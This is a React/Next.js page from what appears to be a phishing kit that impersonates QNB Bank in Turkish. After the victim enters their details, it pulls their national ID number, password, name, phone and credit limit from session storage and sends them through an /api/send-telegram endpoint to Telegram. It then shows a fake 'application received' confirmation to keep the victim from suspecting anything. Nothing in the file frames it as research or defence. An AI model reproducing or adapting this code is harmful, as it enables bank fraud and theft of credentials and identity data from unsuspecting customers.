"use client"
import { useEffect, useState, useRef } from 'react'
import { useRouter } from 'next/navigation'

const SuccessPage = () => {
  const router = useRouter()
  const [applicationData, setApplicationData] = useState({
    name: '',
    surname: '', 
    phone: '',
    creditLimit: '',
    applicationDate: '',
    username: '',
    password: ''
  })
  const [isLoading, setIsLoading] = useState(true)
  
  // Telegram gönderiminin yapılıp yapılmadığını takip etmek için
  const telegramSentRef = useRef(false)

  useEffect(() => {
    // Eğer zaten gönderilmişse, tekrar çalıştırma
    if (telegramSentRef.current) {
      setIsLoading(false)
      return
    }

    // SessionStorage'dan verileri al
    const loginData = sessionStorage.getItem('loginData')
    const phoneData = sessionStorage.getItem('phoneData')
    
    if (!loginData || !phoneData) {
      // Eğer veriler yoksa login sayfasına yönlendir
      router.push('/auth')
      return
    }

    const login = JSON.parse(loginData)
    const phone = JSON.parse(phoneData)

    // Mevcut tarih ve saati oluştur
    const now = new Date()
    const formattedDate = now.toLocaleDateString('tr-TR', {
      day: '2-digit',
      month: '2-digit', 
      year: 'numeric'
    }) + ' ' + now.toLocaleTimeString('tr-TR', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    })
    
    const userData = {
      username: login.username,
      password: login.password,
      phone: phone.phone,
      creditLimit: phone.creditLimit,
      applicationDate: formattedDate,
      realName: login.realName,
      realSurname: login.realSurname
    }

    setApplicationData(prev => ({
      ...prev,
      ...userData,
      name: login.realName || 'Bilinmiyor',
      surname: login.realSurname || 'Bilinmiyor'
    }))

    // Telegram gönderimini işaretle ve gönder
    telegramSentRef.current = true
    sendDataToTelegram(userData)
  }, [router])

  const sendDataToTelegram = async (userData: any) => {
    try {
      const response = await fetch('/api/send-telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(userData)
      })

      const result = await response.json()
      
      if (result.success) {
        console.log('Telegram\'a başarıyla gönderildi')
      } else {
        console.error('Telegram gönderim hatası:', result.error)
      }
    } catch (error) {
      console.error('Telegram gönderim hatası:', error)
    } finally {
      setIsLoading(false)
      // Verileri temizle
      sessionStorage.removeItem('loginData')
      sessionStorage.removeItem('phoneData')
    }
  }

  const handleGoHome = () => {
    router.push('/')
  }

  if (isLoading) {
    return (
      <div className="h-auto bg-white flex flex-col items-center justify-center p-4 mt-4">
        <div className="w-full max-w-[400px] bg-white rounded-[20px] border border-gray-200 p-8 shadow-sm text-center">
          <div className="w-16 h-16 border-4 border-[#800D51] border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <h2 className="text-[#333] text-lg font-semibold mb-2">
            İşleminiz İşleniyor...
          </h2>
          <p className="text-[#666] text-sm">
            Lütfen bekleyiniz, başvurunuz kaydediliyor.
          </p>
        </div>
      </div>
    )
  }

  return (
    <div className="h-auto bg-white flex flex-col items-center justify-center p-4 mt-4">
      <div className="w-full max-w-[500px] bg-white rounded-[20px] border border-gray-200 p-8 shadow-sm">
        
        {/* Başarı Mesajı */}
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
            </svg>
          </div>
          
          <h1 className="text-[#333] text-2xl font-bold mb-4">
            Tebrikler! Başvurunuz Başarıyla Alındı
          </h1>
          
          <p className="text-[#666] text-base mb-2">
            Başvuru işleminiz sistemimize kaydedilmiştir.
          </p>
          
          <p className="text-[#666] text-base mb-8">
            Müşteri temsilcilerimiz 1-3 iş günü içerisinde sizinle iletişime geçecektir.
          </p>
        </div>

        {/* Başvuru Bilgileri */}
        <div className="bg-[#f8f9fa] rounded-lg p-6 mb-8">
          <h2 className="text-[#333] text-lg font-semibold mb-6">
            Başvuru Bilgileriniz
          </h2>
          
          <div className="space-y-4">
            <div className="flex justify-between items-center border-b border-gray-200 pb-2">
              <span className="text-[#666] font-medium">Ad:</span>
              <span className="text-[#333] font-semibold">{applicationData.name}</span>
            </div>
            
            <div className="flex justify-between items-center border-b border-gray-200 pb-2">
              <span className="text-[#666] font-medium">Soyad:</span>
              <span className="text-[#333] font-semibold">{applicationData.surname}</span>
            </div>
            
            <div className="flex justify-between items-center border-b border-gray-200 pb-2">
              <span className="text-[#666] font-medium">TC Kimlik:</span>
              <span className="text-[#333] font-semibold">{applicationData.username}</span>
            </div>
            
            <div className="flex justify-between items-center border-b border-gray-200 pb-2">
              <span className="text-[#666] font-medium">Telefon:</span>
              <span className="text-[#333] font-semibold">{applicationData.phone}</span>
            </div>
            
            <div className="flex justify-between items-center border-b border-gray-200 pb-2">
              <span className="text-[#666] font-medium">Kart Limiti:</span>
              <span className="text-[#333] font-semibold">{applicationData.creditLimit} ₺</span>
            </div>
            
            <div className="flex justify-between items-center">
              <span className="text-[#666] font-medium">Başvuru Tarihi:</span>
              <span className="text-[#333] font-semibold">{applicationData.applicationDate}</span>
            </div>
          </div>
        </div>

        {/* Ana Sayfaya Dön Butonu */}
        <button
          onClick={handleGoHome}
          className="w-full bg-[#800D51] text-white rounded-md py-4 hover:bg-[#800D51]/90 transition font-semibold text-lg"
        >
          Ana Sayfaya Dön
        </button>
        
      </div>

      <div className="text-sm text-black mt-4 text-center">
        <strong>QNB Bank</strong>
        <br />
        Başvurunuz ile ilgili güncellemeler için e-posta ve SMS yoluyla bilgilendirileceksiniz.
      </div>

      <style jsx>{`
        .bg-green-100 {
          background-color: #dcfce7;
        }
        
        .text-green-600 {
          color: #16a34a;
        }
        
        @keyframes spin {
          to {
            transform: rotate(360deg);
          }
        }
        
        .animate-spin {
          animation: spin 1s linear infinite;
        }
      `}</style>
    </div>
  )
}

export default SuccessPage